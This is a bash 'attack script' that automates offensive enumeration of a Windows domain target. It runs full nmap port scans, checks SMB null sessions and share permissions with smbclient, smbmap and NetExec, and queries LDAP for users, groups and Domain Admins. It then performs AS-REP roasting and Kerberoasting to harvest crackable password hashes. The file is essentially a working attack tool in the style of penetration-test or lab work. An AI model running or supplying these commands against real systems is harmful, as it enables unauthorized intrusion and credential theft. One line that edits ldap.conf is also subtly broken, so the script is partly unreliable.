#!/bin/bash

function printhelp() {
        echo "Usage: $0 -t HOSTNAME/IP [-u USERNAME] [-p PASSWORD] [-d DOMAIN]"
}

if [ $# -eq 0 ]; then
        printhelp
        exit 1
fi

while getopts "t:u:p:d:" option; do
  case $option in
    t) # target
      target="$OPTARG"
      ;;
    u) # username
      user="$OPTARG"
      ;;
    p) # password
      password="$OPTARG"
      ;;
    d) # domain
      domain="$OPTARG"
      ;;
    \?) # invalid option
          printhelp
      echo "Invalid option: -$OPTARG" >&2
      exit 1
      ;;
  esac
done

if [ -z $target ]; then
        echo "target required"
        printhelp
        exit 1
fi

timestamp=`date +"%Y%m%d-%H%M%S"`
echo "[+] Executing attack script against target: $target @ $timestamp"

echo "[*] Collecting open ports (port-list.txt)"
# find open ports, store in port-list.txt
ports=$(nmap -p- --min-rate=1000 -T4 $target | grep ^[0-9] | cut -f1 -d '/' | tr '\n' ',' | sed s/,$//)
echo $ports > port-list.txt

echo "[*] Running NMAP Script and Version scans (port-recon.txt)"
# collect additional info about open ports, store in port-recon.txt
nmap -sC -sV -p$ports $target -oN port-recon.txt

echo "[*] Parsing port results and executing modules..."

if grep clock-skew port-recon.txt | cut -d ' ' -f 2; then
	echo "[*] WARN: Clock skew detected in port recon results, attempting to sync with target..."
 	echo "[*] WARN: Clock skew detected in port recon results, attempting to sync with target..." >> port-recon.txt
	date && sudo ntpdate $target && date >> port-recon.txt
 	echo "[*] INFO: ntpdate complete."
  	echo "[*] INFO: ntpdate complete." >> port-recon.txt
fi

# SMB
if grep -qE '^(139,)+|(,139,)|(,139$)' port-list.txt || grep -qE '^(445,)+|(,445,)|(,445$)' port-list.txt; then
    echo "[*] Running SMB module."
        echo "Testing NULL sessions"
        echo "Testing NULL sessions:" >> smb-recon.txt
        smbclient -L "\\\\$target" -U " "%" " >> smb-recon.txt
        if grep "NT_STATUS_LOGON_FAILURE" smb-recon.txt; then
            echo "NULL session check failed with NT_STATUS_LOGON_FAILURE" >> smb-recon.txt
        else
            echo "NULL session success!! (validation command: smbclient -L \\\\$target -U \" \"%\" \")" >> smb-recon.txt
        fi
        if [ ! -z $user ] && [ ! -z $password ]; then
			echo "[*] Credentials detected, using ($user:$password) for SMB enumeration" >> smb-recon.txt
			echo "[*] Running smbclient query"
   			echo "smbclient output:" >> smb-recon.txt
			smbclient -L "\\\\$target" -U "$user"%"$password" >> smb-recon.txt
   			echo "" >> smb-recon.txt
			echo "[*] Running smbmap query"
   			echo "smbmap output:" >> smb-recon.txt
			smbmap -u $user -p $password -H $target  >> smb-recon.txt
   			echo "" >> smb-recon.txt
   			echo "Readable shares:" >> smb-recon.txt
      			nxc smb $target -u $user -p $password --shares --filter-shares READ
	 		echo "" >> smb-recon.txt
    			echo "Writeable shares:" >> smb-recon.txt
      			nxc smb $target -u $user -p $password --shares --filter-shares WRITE
        fi
        echo "[*] SMB module complete."
fi

# LDAP
if grep -qE '^(389,)+|(,389,)|(,389$)' port-list.txt || grep -qE '^(636,)+|(,636,)|(,636$)' port-list.txt; then
    echo "[*] Running LDAP module."
	echo "[*] Running ldapsearch queries"
	ldapsearch -H ldap://$target -x -s base -b '' "(objectClass=*)" "*" > ldap-info.txt 

	ldap_dns_hostname=$(grep dnsHostName ldap-info.txt | awk '{print $2}')
	echo "LDAP DNS Hostname: $ldap_dns_hostname" >> ldap-recon.txt

	ldap_domain_name=$(grep ldapServiceName ldap-info.txt | cut -d ':' -f2)
	echo "LDAP Domain Name: $ldap_domain_name" >> ldap-recon.txt

	base_dn=$(grep rootDomainNamingContext ldap-info.txt | awk '{print $2}')
	echo "LDAP Root Domain Naming Context: $base_dn" >> ldap-recon.txt

	if [ ! -z $user ] && [ ! -z $password ]; then
		if [ -z $domain ]; then
				domain=$ldap_domain_name
		fi
	
		if grep -qE "^TLS_REQCERT allow" /etc/ldap/ldap.conf; then
			echo "[*] INFO: LDAP client setting found"
		else
			echo "[*] INFO: LDAP client setting not found, updating ldap.conf"
			echo "[*] INFO: LDAP client setting not found, updating ldap.conf" >> ldap-recon.txt
			sudo tee -a "TLS_REQCERT allow" >> /etc/ldap/ldap.conf
		fi
	
		## confirm that SLDAP is enabled and required
		#ldap_lockout_threshold=$(ldapsearch -D '$domain\$user' -w '$password' -H ldaps://$target -b "$base_dn" | grep -m 1 lockoutThreshold | cut -d ':' -f 2)
		#echo "LDAP Lockout Threshold: $ldap_lockout_threshold" >> ldap-recon.txt
	
		# TODO: Run windapsearch -o windapsearch-recon.txt
		
		########################################
		# Run NetExec
		########################################
		echo "[*] Running nxc LDAP enum with credentials $user:$password (nxc-recon.txt)"
		# clear the file and output the scan timestamp
		echo "Scan timestamp: $timestamp" > nxc-recon.txt
		echo "Running against target: $target with $user:$password (nxc-recon.txt)" >> nxc-recon.txt
		echo "NXC Domain SID:" >> nxc-recon.txt
		nxc ldap $target -u $user -p $password --get-sid >> nxc-recon.txt
		echo "" >> nxc-recon.txt
		echo "NXC Users:" >> nxc-recon.txt
		nxc ldap $target -u $user -p $password  --users >> nxc-recon.txt
		echo "" >> nxc-recon.txt
		echo "NXC Groups:" >> nxc-recon.txt
		nxc ldap $target -u $user -p $password  --groups >> nxc-recon.txt
		echo "" >> nxc-recon.txt
		echo "NXC Password Not Required:" >> nxc-recon.txt
		nxc ldap $target -u $user -p $password --password-not-required >> nxc-recon.txt
		echo "" >> nxc-recon.txt
		echo "NXC Domain Admins:" >> nxc-recon.txt
		nxc ldap $target -u $user -p $password -M group-mem -o GROUP="Domain Admins" >> nxc-recon.txt
		echo "" >> nxc-recon.txt
		echo "NXC DnsAdmins:" >> nxc-recon.txt
		nxc ldap $target -u $user -p $password -M group-mem -o GROUP="DnsAdmins" >> nxc-recon.txt
		echo "" >> nxc-recon.txt
                # nxc ldap $target -d "domain" -u $user -p $password -M adcs
		truncate -s 0 nxc-aspreproast-output.txt
		echo "NXC AS-REP Roasting in nxc-aspreproast-output.txt" >> nxc-recon.txt
		nxc ldap $target -u $user -p $password --asreproast nxc-aspreproast-output.txt >> nxc-recon.txt
		echo "" >> nxc-recon.txt
		truncate -s 0 nxc-krbroast-output.txt
		echo "NXC Kerberoasting in nxc-krbroast-output.txt" >> nxc-recon.txt
		nxc ldap $target -u $user -p $password --kerberoasting nxc-krbroast-output.txt >> nxc-recon.txt
		if grep KRB_AP_ERR_SKEW nxc-recon.txt | cut -d ' ' -f 2; then
			echo "[*] WARN: Clock skew detected in kerberoasting results, attempting to sync with target..." >> nxc-recon.txt
			date && sudo ntpdate $target && date >> nxc-recon.txt
			echo "[*] Re-running NXC kerberoasting" >> nxc-recon.txt
			nxc ldap $target -u $user -p $password --kerberoasting nxc-krbroast-output.txt >> nxc-recon.txt
		fi
        else
                #Run ldapsearch, Run windapsearch, Run NetExec
                echo "Running unauthenticated LDAP enum"
        fi
        echo "[*] LDAP module complete."
fi

echo "[-] Done."
